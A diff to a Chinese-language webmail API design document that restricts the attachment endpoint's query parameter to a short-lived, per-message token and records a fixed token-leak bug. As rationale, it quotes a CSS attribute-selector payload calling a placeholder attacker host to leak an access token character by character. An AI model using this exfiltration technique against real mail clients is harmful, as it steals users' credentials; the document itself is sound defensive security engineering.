@@ -47,10 +47,18 @@ GET /messages/:id?remote=1   → 同上，但保留远程引用（用户点了�
 `remote_allowed` 为真的两种情况：请求带 `remote=1`，或发件人在信任名单里；此时 `html_body` 保留远程引用。
 否则 `html_body` 已把远程引用换成占位符。`html_body` 无论如何都是净化过的。
 
-响应另带 `attachment_token`：限定这一封、1 小时时效的 JWT，附件端点 `?access_token=` 同时接受它与 access token。
+响应另带 `attachment_token`：限定这一封、1 小时时效的 JWT，附件端点的查询参数**只接受**它。
 前端拼 cid 内联图与附件链接必须用它——这些 URL 会写进邮件 HTML 所在的 iframe 文档，那是攻击者可控的内容；
 带完整 access token 的话，开启远程内容后可用 CSS 属性选择器（`img[src^="…access_token=eyJ…"]{background:url(https://evil/1)}`）
 逐字符外泄，不需要执行脚本（前端安全审查发现，M10 遗留）。泄露附件令牌的代价被压到「拿到本就在看的这封邮件的附件」。
+
+> **2026-09-10 更新（KI-2 收尾）**：上面这条「同时接受两种令牌」已经改掉——查询参数改名为 `?ticket=`
+> 且**只接受 attachment 类型令牌**，access token 只能走 `Authorization: Bearer`（用户主动下载的
+> axios blob 路径）。`VerifyAttachmentAccess` 新增 `fromQuery` 参数，为真时 access token 直接拒；
+> query 的优先级高于请求头，所以同时带两者也不会降级。
+> 原因：旧前端 `attachmentUrl` 有 `opts?.token || auth.access` 的兜底，详情接口没带 attachment_token 时
+> 完整 access token 会落进那份由发件人控制的文档——上面描述的攻击链当时是通的，不只是理论。
+> SSE 端点另走一次性票据（`POST /events/ticket`，60s TTL，握手时核销），详见 `known-issues.md` KI-2。
 
 ## 发件人信任名单
 
